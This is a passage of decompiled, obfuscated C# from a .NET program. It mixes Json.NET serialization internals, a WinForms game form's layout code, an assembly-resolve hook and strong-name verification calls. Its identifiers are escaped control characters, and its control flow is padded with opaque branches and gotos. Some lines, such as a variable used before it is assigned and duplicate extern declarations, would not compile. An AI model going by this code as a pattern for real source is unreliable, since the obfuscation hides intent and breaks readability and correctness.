      if (obj7.\u0001 != null && !obj7.\u0001.Equals((object) \u0014.\u0006.\u0001(_param5)))
        goto label_25;
label_2:
      _param3 = (CultureInfo) null;
label_3:
      if (obj7.\u0001.HasValue)
      {
        int num = (int) _param5.\u0001;
        \u0004.\u0001? nullable = obj7.\u0001;
        int valueOrDefault = (int) nullable.GetValueOrDefault();
        if ((num == valueOrDefault ? (!nullable.HasValue ? 1 : 0) : 1) != 0)
        {
          _param0 = new \u0004.\u0001?(_param5.\u0001);
          \u0014.\u0006.\u0001(_param5, obj7.\u0001.GetValueOrDefault());
          goto label_7;
        }
      }
      _param0 = new \u0004.\u0001?();
label_7:
      if (obj7.\u0001.HasValue)
      {
        int num = (int) _param5.\u0001;
        \u000E.\u0002? nullable = obj7.\u0001;
        int valueOrDefault = (int) nullable.GetValueOrDefault();
        if ((num == valueOrDefault ? (!nullable.HasValue ? 1 : 0) : 1) != 0)
        {
          _param4 = new \u000E.\u0002?(_param5.\u0001);
          \u0014.\u0006.\u0001(_param5, obj7.\u0001.GetValueOrDefault());
          goto label_11;
        }
      }
      _param4 = new \u000E.\u0002?();
label_11:
      if (obj7.\u0001.HasValue)
      {
        int num = (int) _param5.\u0001;
        \u0015.\u0002? nullable = obj7.\u0001;
        int valueOrDefault = (int) nullable.GetValueOrDefault();
        if ((num == valueOrDefault ? (!nullable.HasValue ? 1 : 0) : 1) != 0)
        {
          _param2 = new \u0015.\u0002?(_param5.\u0001);
          if (true)
          {
            \u0014.\u0006.\u0001(obj7.\u0001.GetValueOrDefault(), _param5);
            goto label_16;
          }
          else
            goto label_2;
        }
      }
      _param2 = new \u0015.\u0002?();
label_16:
      if (obj7.\u0001)
      {
        int? nullable1 = _param5.\u0001;
        int? nullable2 = obj7.\u0001;
        if ((nullable1.GetValueOrDefault() == nullable2.GetValueOrDefault() ? (nullable1.HasValue != nullable2.HasValue ? 1 : 0) : 1) != 0)
        {
          _param6 = _param5.\u0001;
          \u0014.\u0006.\u0001(obj7.\u0001, _param5);
          goto label_20;
        }
      }
      _param6 = new int?();
label_20:
      if (obj7.\u0002 && _param5.\u0001 != obj7.\u0001)
      {
        _param1 = _param5.\u0001;
        _param5.\u0001 = obj7.\u0001;
      }
      else
        _param1 = (string) null;
      if (!(_param5 is \u0011.\u0003 obj) || !(obj7.\u0001 is DefaultContractResolver contractResolver))
        return;
      obj.\u0001 = \u0014.\u0006.\u0001(contractResolver).\u0001;
      return;
label_25:
      _param3 = \u0014.\u0006.\u0001(_param5);
      _param5.\u0001 = obj7.\u0001;
      goto label_3;
    }

    static IDictionary \u0001([In] \u0003.\u0006 obj0)
    {
      if (obj0.\u0001 == null)
      {
        // ISSUE: type reference
        System.Type type1 = \u0004\u0002.\u0084\u0004(__typeref (Dictionary<,>));
        System.Type[] typeArray = new System.Type[2];
        System.Type type2 = obj0.\u0001();
        if ((object) type2 == null)
        {
          // ISSUE: type reference
          type2 = \u0004\u0002.\u0084\u0004(__typeref (object));
        }
        typeArray[0] = type2;
        System.Type type3 = obj0.\u0003();
        if ((object) type3 == null)
        {
          // ISSUE: type reference
          type3 = \u0004\u0002.\u0084\u0004(__typeref (object));
        }
        typeArray[1] = type3;
        System.Type type4 = type1.MakeGenericType(typeArray);
        obj0.\u0001 = \u0014.\u0006.\u0001().\u0001<object>(type4);
      }
      return (IDictionary) obj0.\u0001();
    }

    static IList \u0001([In] \u0001.\u0007 obj0)
    {
      if (obj0.\u0001 == null)
        goto label_5;
label_4:
      return (IList) obj0.\u0001();
label_5:
      System.Type type1;
      if (obj0.\u0001() || (object) obj0.\u0001() == null)
      {
        if (true)
        {
          // ISSUE: type reference
          type1 = \u0004\u0002.\u0084\u0004(__typeref (object));
          goto label_7;
        }
      }
      else
        goto label_6;
label_3:
      System.Type type2;
      // ISSUE: type reference
      System.Type type3 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (List<>)), new System.Type[1]
      {
        type2
      });
      obj0.\u0001 = \u0014.\u0006.\u0001().\u0001<object>(type3);
      goto label_4;
label_6:
      type1 = obj0.\u0001();
label_7:
      type2 = type1;
      goto label_3;
    }

    static void \u0001([In] Stream obj0, [In] Stream obj1)
    {
      byte[] numArray = new byte[81920];
label_1:
      while (true)
      {
        int num;
        while ((num = \u0008\u0004.\u007E\u009C\u0007((object) obj1, numArray, 0, numArray.Length)) != 0)
        {
          if (true)
            \u000E\u0004.\u007E\u009D\u0007((object) obj0, numArray, 0, num);
          else
            goto label_1;
        }
        break;
      }
    }

    static \u0010.\u0003 \u0001([In] \u0003.\u0006 obj0, [In] object obj1)
    {
      if (obj0.\u0001 == null)
        goto label_2;
label_1:
      return (\u0010.\u0003) obj0.\u0001(new object[1]
      {
        obj1
      });
label_2:
      // ISSUE: type reference
      obj0.\u0004 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (DictionaryWrapper<,>)), new System.Type[2]
      {
        obj0.\u0001(),
        obj0.\u0003()
      });
      ConstructorInfo constructorInfo = \u0012\u0002.\u007E\u0093\u0004((object) obj0.\u0004, new System.Type[1]
      {
        obj0.\u0003
      });
      obj0.\u0001 = \u0014.\u0006.\u0001().\u0001((MethodBase) constructorInfo);
      goto label_1;
    }

    static \u0001.\u0008 \u0001([In] \u000F.\u0007 obj0) => obj0.\u0001;

    static string \u0001([In] char obj0) => \u0014.\u0006.\u0001(\u0082\u0004.\u001B\u0008(obj0));

    static bool \u0001([In] System.Type obj0)
    {
label_0:
      int num1;
      // ISSUE: type reference
      while (!\u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IConvertible)), obj0))
      {
        do
        {
          if (true)
          {
            if (!\u0014.\u0006.\u0001(obj0))
              goto label_11;
          }
          else
            goto label_0;
        }
        while (false);
        // ISSUE: type reference
        int num2 = \u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IConvertible)), \u0099\u0002.\u001F\u0006(obj0)) ? 1 : 0;
        if (true)
        {
          if (num2 == 0)
            goto label_11;
          else
            break;
        }
        else
        {
          num1 = num2;
          goto label_9;
        }
      }
      if (true)
      {
        // ISSUE: type reference
        num1 = !\u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (\u0015.\u0013)), obj0) ? 1 : 0;
      }
      else
        goto label_11;
label_9:
      return false ? num1 != 0 : num1 != 0;
label_11:
      return false;
    }

    static System.Type \u0001([In] JsonProperty obj0) => obj0.\u0001;

    static void \u0001([In] \u0012.\u0007 obj0, [In] CultureInfo obj1) => obj0.\u0001 = obj1;

    static void \u0001()
    {
      AppDomain appDomain1 = \u0097\u0003.\u0089\u0007();
      AppDomain appDomain2;
      if (true)
        appDomain2 = appDomain1;
      AppDomain appDomain3 = appDomain2;
      // ISSUE: reference to a compiler-generated field
      if (\u0005.\u0002.\u0001 == null)
      {
        // ISSUE: reference to a compiler-generated field
        \u0005.\u0002.\u0001 = new ResolveEventHandler(\u0014.\u0006.\u0001);
      }
      // ISSUE: reference to a compiler-generated field
      ResolveEventHandler resolveEventHandler = \u0005.\u0002.\u0001;
      appDomain3.AssemblyResolve += resolveEventHandler;
    }

    static IEnumerable<\u0015.\u0013> \u0001([In] \u0015.\u0013 obj0) => \u0014.\u0006.\u0001(obj0, true);

    static void \u0001([In] DefaultContractResolver obj0, [In] \u0016.\u0007 obj1, [In] System.Type obj2)
    {
      while (true)
      {
        List<\u0008.\u000E> objList1;
        List<\u0008.\u000E> objList2;
        List<\u0008.\u000E> objList3;
        List<\u0008.\u000E> objList4;
        List<\u0004.\u000E> objList5;
        obj0.\u0001(obj2, out objList1, out objList2, out objList3, out objList4, out objList5);
        if (objList1 != null)
        {
          if (true)
          {
            if (true)
              \u000E.\u0008.\u0001<\u0008.\u000E>(\u0014.\u0006.\u0001(obj1), (IEnumerable<\u0008.\u000E>) objList1);
            else
              goto label_7;
          }
          else
            continue;
        }
        if (true)
        {
          if (objList2 == null)
            goto label_7;
        }
        else
          continue;
label_6:
        \u000E.\u0008.\u0001<\u0008.\u000E>(\u0014.\u0006.\u0001(obj1), (IEnumerable<\u0008.\u000E>) objList2);
label_7:
        if (objList3 != null)
          \u000E.\u0008.\u0001<\u0008.\u000E>(\u0014.\u0006.\u0001(obj1), (IEnumerable<\u0008.\u000E>) objList3);
        if (objList4 != null)
        {
          if (true)
            \u000E.\u0008.\u0001<\u0008.\u000E>(\u0014.\u0006.\u0001(obj1), (IEnumerable<\u0008.\u000E>) objList4);
          else
            goto label_6;
        }
        if (objList5 == null)
          break;
        \u000E.\u0008.\u0001<\u0004.\u000E>(\u0014.\u0006.\u0001(obj1), (IEnumerable<\u0004.\u000E>) objList5);
        break;
      }
    }

    static \u0015.\u0010 \u0001() => DefaultContractResolver.\u0001;

    static Bitmap \u0001() => (Bitmap) \u0084\u0004.\u007E\u001D\u0008((object) \u0014.\u0006.\u0001(), \u0014.\u0006.\u0082(18757), \u0005.\u0001.\u0001);

    static \u0015.\u0004 \u0001([In] JsonProperty obj0)
    {
      \u0015.\u0004? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0015.\u0004) num;
      return num == 0 ? \u0015.\u0004.\u0001 : nullable.GetValueOrDefault();
    }

    static bool \u0001([In] char obj0) => \u009A.\u000F\u0004(obj0);

    static string \u0001([In] XmlNamespaceManager obj0, [In] IXmlNode obj1, [In] XmlNodeConverter obj2)
    {
      switch (obj1.\u0001())
      {
        case XmlNodeType.Element:
          return \u0007\u0002.\u008C\u0004(obj1.\u0003(), \u0014.\u0006.\u0082(9935)) ? global::\u0006.\u009B(\u0014.\u0006.\u0082(18766), obj1.\u0001()) : \u0014.\u0006.\u0001(obj2, obj1, obj0);
        case XmlNodeType.Attribute:
          return \u0007\u0002.\u008C\u0004(obj1.\u0003(), \u0014.\u0006.\u0082(9935)) ? global::\u0006.\u009B(\u0014.\u0006.\u0082(18766), obj1.\u0001()) : global::\u0006.\u009B(\u0014.\u0006.\u0082(18771), \u0014.\u0006.\u0001(obj2, obj1, obj0));
        case XmlNodeType.Text:
          return \u0014.\u0006.\u0082(17883);
        case XmlNodeType.CDATA:
          return \u0014.\u0006.\u0082(17892);
        case XmlNodeType.ProcessingInstruction:
          return global::\u0006.\u009B(\u0014.\u0006.\u0082(16707), \u0014.\u0006.\u0001(obj2, obj1, obj0));
        case XmlNodeType.Comment:
          return \u0014.\u0006.\u0082(18776);
        case XmlNodeType.DocumentType:
          if (true)
            return global::\u0006.\u009B(\u0014.\u0006.\u0082(18451), \u0014.\u0006.\u0001(obj2, obj1, obj0));
          goto case XmlNodeType.SignificantWhitespace;
        case XmlNodeType.Whitespace:
          return \u0014.\u0006.\u0082(17913);
        case XmlNodeType.SignificantWhitespace:
          return \u0014.\u0006.\u0082(17930);
        case XmlNodeType.XmlDeclaration:
          return \u0014.\u0006.\u0082(11880);
        default:
          throw new JsonSerializationException(\u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(18789), (object) obj1.\u0001()));
      }
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonWriter obj1, [In] bool obj2)
    {
label_0:
      if (true)
        \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(3503));
      \u0014.\u0006.\u0001(obj0, true, obj2, obj1, true);
      if (false)
        goto label_0;
    }

    static void \u0001([In] \u0015.\u0013 obj0, [In] \u0004.\u0011 obj1) => obj0.\u0001 = obj1;

    static StreamingContext \u0001([In] \u0016.\u0001 obj0)
    {
      while (true)
      {
        StreamingContext? nullable = obj0.\u0001;
        if (true)
        {
          if (nullable.HasValue)
            return nullable.GetValueOrDefault();
          break;
        }
      }
      return \u0016.\u0001.\u0001;
    }

    static void \u0001([In] string obj0, [In] \u0015.\u0012 obj1)
    {
      if (obj1.\u0001 == null)
        return;
      obj1.\u0001.Remove(obj0);
    }

    static \u0002.\u0003 \u0001([In] \u0012.\u0007 obj0, [In] \u000F.\u0007 obj1)
    {
      while (true)
      {
        if (obj0.\u0001() == JsonToken.None)
        {
          if (true)
          {
            if (!obj0.\u0001())
              break;
          }
          else
            continue;
        }
        \u0014.\u0006.\u0001(obj0);
        \u0002.\u0003 obj = obj0.\u0001() == JsonToken.StartConstructor ? new \u0002.\u0003((string) obj0.\u0001()) : throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18915), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
        \u0014.\u0006.\u0001((\u0015.\u0013) obj, obj0 as \u000F.\u0001, obj1);
        \u0014.\u0006.\u0001((\u0004.\u0011) obj, obj0, obj1);
        return obj;
      }
      throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(18854));
    }

    static bool \u0001(
      CultureInfo _param0,
      ref DateTimeOffset _param1,
      string _param2,
      [Out] string _param3)
    {
      int num;
      do
      {
        DateTimeOffset dateTimeOffset;
        num = \u007F\u0004.\u0018\u0008(_param2, _param3, (IFormatProvider) _param0, DateTimeStyles.RoundtripKind, ref dateTimeOffset) ? 1 : 0;
        if (true)
        {
          if (num == 0)
            goto label_4;
          else
            goto label_6;
label_2:
          continue;
label_4:
          if (false)
            goto label_2;
          else
            goto label_7;
label_6:
          _param1 = dateTimeOffset;
          goto label_2;
        }
        else
          goto label_5;
      }
      while (false);
      goto label_3;
label_5:
      return num != 0;
label_3:
      return true;
label_7:
      _param1 = new DateTimeOffset();
      return false;
    }

    static void \u0001([In] byte[] obj0, [In] int obj1, [In] \u0013.\u000F.\u0002 obj2, [In] int obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj2.\u0003 += 8;
label_5:
      obj2.\u0001 = obj0;
      obj2.\u0001 = obj3;
      int num;
      obj2.\u0002 = num;
      return;
label_6:
      if (obj2.\u0001 < obj2.\u0002)
        throw new InvalidOperationException();
      num = obj3 + obj1;
      if (0 > obj3 || obj3 > num || num > obj0.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj1 & 1) != 0)
      {
        obj2.\u0001 |= (uint) (((int) obj0[obj3++] & (int) byte.MaxValue) << obj2.\u0003);
        goto label_4;
      }
      else
        goto label_5;
    }

    static void \u0001(ref string _param0, out string _param1, [Out] string _param2)
    {
      do
      {
        int num;
        if (true)
        {
          num = \u0086\u0004.\u007E\u001E\u0008((object) _param2, ':');
          if (false)
            break;
          if (num != -1 && num != 0)
          {
            if (true)
            {
              if (\u001F.\u007E\u0011\u0003((object) _param2) - 1 != num)
                goto label_7;
              else
                goto label_10;
            }
          }
          else
            goto label_10;
        }
        else
          goto label_7;
label_5:
        _param1 = _param2;
        break;
label_7:
        if (true)
        {
          _param0 = \u0080.\u007E\u001B\u0003((object) _param2, 0, num);
          _param1 = \u0097\u0002.\u007E\u001C\u0006((object) _param2, num + 1);
          continue;
        }
label_10:
        _param0 = (string) null;
        goto label_5;
      }
      while (false);
    }

    static ConstructorInfo \u0001([In] DefaultContractResolver obj0, [In] System.Type obj1)
    {
      IList<ConstructorInfo> list = (IList<ConstructorInfo>) ((IEnumerable<ConstructorInfo>) \u0019\u0004.\u007E\u0011\u0008((object) obj1, BindingFlags.Instance | BindingFlags.Public)).ToList<ConstructorInfo>();
      return list.Count != 1 ? (ConstructorInfo) null : list[0];
    }

    static \u0001.\u0002 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0001.\u0002? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0001.\u0002) num;
      return num == 0 ? \u0001.\u0002.\u0001 : nullable.GetValueOrDefault();
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] \u0010.\u0006 obj0, [In] \u0008.\u0004 obj1, [In] \u0008.\u0004 obj2) => (obj1 & obj2) == obj2;

    static void \u0001([In] \u0013.\u000F.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static JsonToken \u0001([In] JsonWriter obj0, [In] JsonContainerType obj1)
    {
      int num1 = (int) (obj1 - 1);
      if (false)
        return (JsonToken) num1;
      int num2;
      switch (num1)
      {
        case 0:
          num2 = 13;
          break;
        case 1:
          int num3 = 14;
          if (num3 == 0)
          {
            num2 = num3;
            break;
          }
          return num3 == 0 ? (JsonToken) num3 : (JsonToken) num3;
        case 2:
          return JsonToken.EndConstructor;
        default:
          if (true)
            throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(19040), (object) obj1), (Exception) null);
          goto case 0;
      }
      return num2 == 0 ? (JsonToken) num2 : (JsonToken) num2;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] FormGame obj0)
    {
      obj0.\u0001 = (IContainer) new Container();
      obj0.\u0001 = new System.Windows.Forms.Label();
      obj0.\u0001 = new System.Windows.Forms.Timer(obj0.\u0001);
      obj0.\u0002 = new System.Windows.Forms.Label();
      obj0.\u0001 = new TextBox();
      obj0.\u0001 = new Button();
      obj0.\u0002 = new Button();
      obj0.\u0002 = new System.Windows.Forms.Timer(obj0.\u0001);
      obj0.\u0003 = new System.Windows.Forms.Label();
      obj0.\u0004 = new System.Windows.Forms.Label();
      global::\u0011.\u0014\u0002((object) obj0);
      global::\u0012.\u007E\u0087\u0002((object) obj0.\u0001, true);
      \u0082.\u007E\u0081\u0003((object) obj0.\u0001, \u0081.\u001E\u0003());
      \u0087\u0004.\u007E\u007F\u0008((object) obj0.\u0001, new Font(\u0014.\u0006.\u0082(19077), 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0));
      \u0082.\u007E\u0082\u0003((object) obj0.\u0001, \u0081.\u001C\u0003());
      if (true)
        \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0001, new Point(25, 29));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19098));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0001, new Size(218, 16));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0001, 0);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19115));
      \u0012\u0003.\u007E\u0095\u0006((object) obj0.\u0001, new EventHandler(obj0.\u0002));
      global::\u0012.\u007E\u0087\u0002((object) obj0.\u0002, true);
      \u0082.\u007E\u0081\u0003((object) obj0.\u0002, \u0081.\u001E\u0003());
      \u0087\u0004.\u007E\u007F\u0008((object) obj0.\u0002, new Font(\u0014.\u0006.\u0082(19077), 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0));
      \u0082.\u007E\u0082\u0003((object) obj0.\u0002, \u0081.\u001C\u0003());
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0002, new Point(25, 505));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(19144));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0002, new Size(239, 16));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0002, 1);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(19157));
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0001, new Point(28, 524));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19186));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0001, new Size(348, 20));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0001, 2);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19207));
      \u0082.\u007E\u0081\u0003((object) obj0.\u0001, \u0081.\u001F\u0003());
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0001, new Point(28, 551));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19244));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0001, new Size(348, 33));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0001, 3);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0001, \u0014.\u0006.\u0082(19269));
      global::\u0012.\u007E\u0088\u0002((object) obj0.\u0001, false);
      \u0012\u0003.\u007E\u0096\u0006((object) obj0.\u0001, new EventHandler(obj0.\u0003));
      \u0082.\u007E\u0081\u0003((object) obj0.\u0002, \u0081.\u007F\u0003());
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0002, new Point(28, 479));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(19330));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0002, new Size(348, 23));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0002, 4);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0002, \u0014.\u0006.\u0082(19363));
      global::\u0012.\u007E\u0088\u0002((object) obj0.\u0002, false);
      \u0012\u0003.\u007E\u0096\u0006((object) obj0.\u0002, new EventHandler(obj0.\u0004));
      \u0018.\u007E\u0092\u0002((object) obj0.\u0002, 1000);
      \u0012\u0003.\u007E\u0095\u0006((object) obj0.\u0002, new EventHandler(obj0.\u0005));
      global::\u0012.\u007E\u0087\u0002((object) obj0.\u0003, true);
      \u0082.\u007E\u0081\u0003((object) obj0.\u0003, \u0081.\u001E\u0003());
      \u0089\u0004.\u007E\u0081\u0008((object) obj0.\u0003, BorderStyle.Fixed3D);
      \u0087\u0004.\u007E\u007F\u0008((object) obj0.\u0003, new Font(\u0014.\u0006.\u0082(19392), 48f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0));
      \u0082.\u007E\u0082\u0003((object) obj0.\u0003, \u0081.\u0080\u0003());
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0003, new Point(28, 320));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0003, \u0014.\u0006.\u0082(19421));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0003, new Size(220, 80));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0003, 5);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0003, \u0014.\u0006.\u0082(19442));
      global::\u0012.\u007E\u0087\u0002((object) obj0.\u0004, true);
      \u0082.\u007E\u0081\u0003((object) obj0.\u0004, \u0081.\u001E\u0003());
      \u0087\u0004.\u007E\u007F\u0008((object) obj0.\u0004, new Font(\u0014.\u0006.\u0082(19077), 12f, FontStyle.Bold));
      \u0082.\u007E\u0082\u0003((object) obj0.\u0004, \u0081.\u001C\u0003());
      \u0088\u0004.\u007E\u0080\u0008((object) obj0.\u0004, new Point(24, 455));
      \u0019.\u007E\u009A\u0002((object) obj0.\u0004, \u0014.\u0006.\u0082(19451));
      \u0015\u0003.\u007E\u009B\u0006((object) obj0.\u0004, new Size(261, 16));
      \u0018.\u007E\u0095\u0002((object) obj0.\u0004, 6);
      \u0019.\u007E\u0098\u0002((object) obj0.\u0004, \u0014.\u0006.\u0082(19476));
      \u0013\u0003.\u0098\u0006((object) obj0, new SizeF(6f, 13f));
      \u0014\u0003.\u0099\u0006((object) obj0, AutoScaleMode.Font);
      \u008A\u0004.\u007E\u0082\u0008((object) obj0, (Image) \u0014.\u0006.\u0001());
      \u0015\u0003.\u009A\u0006((object) obj0, new Size(840, 596));
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0004);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0003);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0002);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0001);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0001);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0002);
      \u008C\u0004.\u007E\u0084\u0008((object) \u008B\u0004.\u0083\u0008((object) obj0), (Control) obj0.\u0001);
      \u0019.\u009A\u0002((object) obj0, \u0014.\u0006.\u0082(19509));
      \u008D\u0004.\u0086\u0008((object) obj0, new FormClosingEventHandler(obj0.\u0001));
      \u0012\u0003.\u0097\u0006((object) obj0, new EventHandler(obj0.\u0001));
      global::\u0012.\u0086\u0002((object) obj0, false);
      global::\u0011.\u0017\u0002((object) obj0);
    }

    static bool \u0001(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] Exception obj3,
      [In] \u000F.\u0001 obj4,
      [In] \u0016.\u0007 obj5,
      [In] \u0016.\u0008 obj6)
    {
      \u0005.\u000E obj = \u0014.\u0006.\u0001(obj0, obj1, obj2, obj6, obj3);
      if (obj6.\u0001 != null && obj6.\u0001.\u0001() >= TraceLevel.Error && !obj.\u0001())
      {
        obj.\u0001(true);
        // ISSUE: type reference
        string str1 = (object) \u0001\u0002.\u0017\u0004((object) obj6) == (object) \u0004\u0002.\u0084\u0004(__typeref (\u0010.\u0006)) ? \u0014.\u0006.\u0082(19551) : \u0014.\u0006.\u0082(19522);
        if (obj5 != null)
          str1 = global::\u000F.\u0005\u0002((object) str1, (object) \u0014.\u0006.\u0082(3329), (object) obj5.\u0002());
        string str2 = global::\u0005.\u0099(str1, \u0014.\u0006.\u0082(19576), global::\u0001.\u007E\u0015((object) obj3));
        if (!(obj3 is JsonException))
          str2 = \u0011.\u0002.\u0001(obj4, obj0, str2);
        obj6.\u0001.\u0001(TraceLevel.Error, str2, obj3);
      }
      if (obj5 != null && obj1 != null)
        \u0014.\u0006.\u0001(obj, obj5, obj1, obj6.\u0001.\u0001());
      if (!obj.\u0002())
        \u0014.\u0006.\u0001(obj6.\u0001, new \u0012.\u0013(obj1, obj));
      return obj.\u0002();
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    static bool \u0001([In] System.Type obj0, [In] System.Type obj1) => \u0014.\u0006.\u0001(obj0, obj1, out System.Type _);

    static void \u0001([In] \u0015.\u0013 obj0)
    {
      if (false)
        return;
      if (obj0.\u0001 == null)
        throw new InvalidOperationException(\u0014.\u0006.\u0082(14070));
      obj0.\u0001.\u0001(obj0);
    }

    static \u0006.\u0004 \u0001([In] \u0011.\u0008 obj0)
    {
      while (obj0.\u0002 == null)
      {
        if (true)
        {
          obj0.\u0002 = new \u0006.\u0004(obj0.\u0002());
          break;
        }
      }
      return obj0.\u0002;
    }

    static bool \u0001([In] \u0011.\u0003 obj0)
    {
      while (obj0.\u0001 == obj0.\u0002)
      {
        if (true)
        {
          if (\u0014.\u0006.\u0001(false, obj0) == 0)
          {
            obj0.\u0001 = true;
            return true;
          }
          goto label_3;
        }
      }
      goto label_5;
label_3:
      return false;
label_5:
      ++obj0.\u0002;
      goto label_3;
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0003))
        goto label_4;
label_2:
      if (true)
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(19581));
label_4:
      \u0011.\u0003 obj = obj0;
      if (true)
        goto label_5;
label_1:
      if (true)
        return;
      goto label_2;
label_5:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Null);
      goto label_1;
    }

    static bool[] \u0001([In] char obj0, [In] \u0001.\u0003 obj1)
    {
      if (obj1 == \u0001.\u0003.\u0003)
        return \u0016.\u0005.\u0003;
      return obj0 == '"' ? \u0016.\u0005.\u0002 : \u0016.\u0005.\u0001;
    }

    static \u0002.\u0006 \u0001(
      [In] \u0011.\u000E obj0,
      [In] XmlNodeConverter obj1,
      [In] XmlNamespaceManager obj2,
      [In] string obj3,
      [In] string obj4)
    {
      string str1 = \u001B.\u0004\u0003(obj4);
      string str2 = global::\u0007.\u009E(obj3) ? global::\u0001.\u007E\u0016((object) obj2) : \u0016\u0003.\u007E\u009D\u0006((object) obj2, obj3);
      return global::\u0007.\u009E(str2) ? obj0.\u0001(str1) : obj0.\u0001(str1, str2);
    }

    static IEnumerable<IXmlNode> \u0001(
      [In] XmlNodeConverter obj0_1,
      [In] IEnumerable<IXmlNode> obj1)
    {
